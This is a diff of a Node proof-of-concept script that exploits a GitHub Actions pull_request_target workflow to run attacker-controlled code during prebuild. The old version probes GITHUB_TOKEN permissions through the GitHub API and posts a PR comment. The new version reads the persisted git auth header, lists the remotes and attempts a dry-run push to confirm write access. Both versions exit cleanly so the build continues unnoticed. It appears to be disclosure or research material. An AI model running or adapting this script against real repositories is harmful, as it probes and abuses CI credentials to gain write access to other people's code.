@@ -1,125 +1,50 @@
 // scripts/poc.mjs  (Node 20+, ESM)
-import fs from 'node:fs/promises';
+import { execSync } from 'node:child_process';
 
-const env = process.env;
-const repo = env.GITHUB_REPOSITORY || '';         // "owner/repo"
-const token = env.GITHUB_TOKEN || '';
-const apiBase = env.GITHUB_API_URL || 'https://api.github.com';
-const eventPath = env.GITHUB_EVENT_PATH;
-const eventName = env.GITHUB_EVENT_NAME;
-const ref = env.GITHUB_REF;                       // e.g., refs/pull/123/merge
-const headRef = env.GITHUB_HEAD_REF;              // source branch name on PRs
-const actor = env.GITHUB_ACTOR;                   // user who triggered the run
-
-console.log('PoC: attacker-controlled code executed in pull_request_target (prebuild)');
-console.log(`[debug] event=${eventName} repo=${repo} ref=${ref} headRef=${headRef} actor=${actor}`);
-console.log(`[debug] tokenPresent=${Boolean(token)} eventPathPresent=${Boolean(eventPath)}`);
-
-async function getPrNumber() {
-  // 1) Try event payload first
+function run(cmd) {
   try {
-    if (eventPath) {
-      const payloadRaw = await fs.readFile(eventPath, 'utf8');
-      const payload = JSON.parse(payloadRaw);
-      const n = payload?.pull_request?.number;
-      if (n) return n;
-    }
+    const out = execSync(cmd, { stdio: ['ignore', 'pipe', 'pipe'], encoding: 'utf8' });
+    return { ok: true, out };
   } catch (e) {
-    console.log('[debug] reading event payload failed:', e.message);
+    return { ok: false, out: e.stdout?.toString() || '', err: e.stderr?.toString() || e.message };
   }
-
-  // 2) Fallback: parse from GITHUB_REF like "refs/pull/123/merge"
-  if (ref && ref.startsWith('refs/pull/')) {
-    const m = ref.match(/^refs\/pull\/(\d+)\/(merge|head)$/i);
-    if (m) return Number(m[1]);
-  }
-
-  // 3) Last resort: query the API for PRs whose head is actor:branch
-  try {
-    if (repo && token && headRef && actor) {
-      const url = new URL(`${apiBase}/repos/${repo}/pulls`);
-      url.searchParams.set('state', 'open');
-      url.searchParams.set('head', `${actor}:${headRef}`); // "owner:branch"
-      const res = await fetch(url, {
-        headers: {
-          Authorization: `Bearer ${token}`,
-          'User-Agent': 'poc-script',
-          Accept: 'application/vnd.github+json'
-        }
-      });
-      console.log('[debug] PR lookup via head=actor:branch status:', res.status);
-      const arr = (await res.json()) || [];
-      if (Array.isArray(arr) && arr.length) {
-        return arr[0].number;
-      }
-    }
-  } catch (e) {
-    console.log('[debug] PR lookup failed:', e.message);
-  }
-
-  return undefined;
 }
 
-(async () => {
-  const prNumber = await getPrNumber();
+console.log('PoC: attacker-controlled code executed in pull_request_target (prebuild)');
 
-  if (!repo || !prNumber || !token) {
-    console.log(`[warn] Missing inputs; skipping write test. repo=${Boolean(repo)} pr=${Boolean(prNumber)} token=${Boolean(token)}`);
-    // Do not fail the build:
-    process.exit(0);
-  }
+// 1) Show that checkout left GitHub auth in git config
+const extra = run("git config --local --get-regexp '^http\\.https://github\\.com/\\.extraheader$' || true");
+if (extra.ok && extra.out.trim()) {
+  console.log('[evidence] GitHub extraheader is present (auth is configured for this job).');
+} else {
+  console.log('[evidence] No extraheader found (auth not persisted by checkout).');
+}
+console.log('[debug] extraheader value (masked by GitHub):', (extra.out || '').trim());
 
-  // Optional read probe via GraphQL
-  try {
-    const [owner, name] = repo.split('/');
-    const gql = await fetch(`${apiBase}/graphql`, {
-      method: 'POST',
-      headers: {
-        Authorization: `Bearer ${token}`,
-        'User-Agent': 'poc-script',
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({
-        query: `query($owner:String!,$name:String!){
-          viewer{login}
-          repository(owner:$owner,name:$name){ viewerPermission }
-        }`,
-        variables: { owner, name }
-      })
-    });
-    console.log('GraphQL probe status:', gql.status);
-    const body = await gql.text();
-    console.log('GraphQL probe body:', body.slice(0, 300));
-  } catch (e) {
-    console.log('GraphQL probe failed:', e.message);
-  }
+// 2) Show current remotes
+const rem = run('git remote -v');
+console.log('[debug] git remotes:\n' + rem.out.trim());
 
-  // Harmless write: post PR comment
-  try {
-    const res = await fetch(`${apiBase}/repos/${repo}/issues/${prNumber}/comments`, {
-      method: 'POST',
-      headers: {
-        Authorization: `Bearer ${token}`,
-        'User-Agent': 'poc-script',
-        'Content-Type': 'application/json',
-        Accept: 'application/vnd.github+json'
-      },
-      body: JSON.stringify({
-        body: '🔐 PoC: `pull_request_target` write test. If you see this, the workflow token had PR write perms.'
-      })
-    });
-    console.log('Comment POST status:', res.status);
-    if (res.status === 201) {
-      console.log('✅ Write confirmed: PR comment created.');
-    } else if (res.status === 403) {
-      console.log('🟡 Likely read-only token (403). No write perms.');
-    } else {
-      const t = await res.text();
-      console.log('ℹ️ Unexpected response posting comment:', t.slice(0, 500));
-    }
-  } catch (e) {
-    console.log('Comment POST failed:', e.message);
-  }
+// 3) Determine a safe target branch name for a DRY-RUN push
+// Use the current HEAD ref name if available, else "poc-write-test"
+let target = 'poc-write-test';
+const curBranch = run('git rev-parse --abbrev-ref HEAD');
+if (curBranch.ok) {
+  const name = curBranch.out.trim();
+  if (name && name !== 'HEAD') target = name;
+}
+console.log('[debug] dry-run target ref: refs/heads/' + target);
 
-  process.exit(0);
-})();
+// 4) Attempt a DRY-RUN push (never creates anything)
+const dry = run(`git push --dry-run origin HEAD:refs/heads/${target}`);
+if (dry.ok) {
+  console.log('✅ DRY-RUN push succeeded. This credential appears WRITE-CAPABLE.');
+  console.log('[note] Even though no change was pushed (dry-run), a real push would likely succeed.');
+} else {
+  // Common failure strings: "Permission to ... denied", "cannot access", "read-only"
+  console.log('🟡 DRY-RUN push blocked (likely READ-ONLY token or protected settings).');
+  console.log('[stderr]:', (dry.err || '').slice(0, 500));
+}
+
+// 5) Exit cleanly so the build proceeds
+process.exit(0);
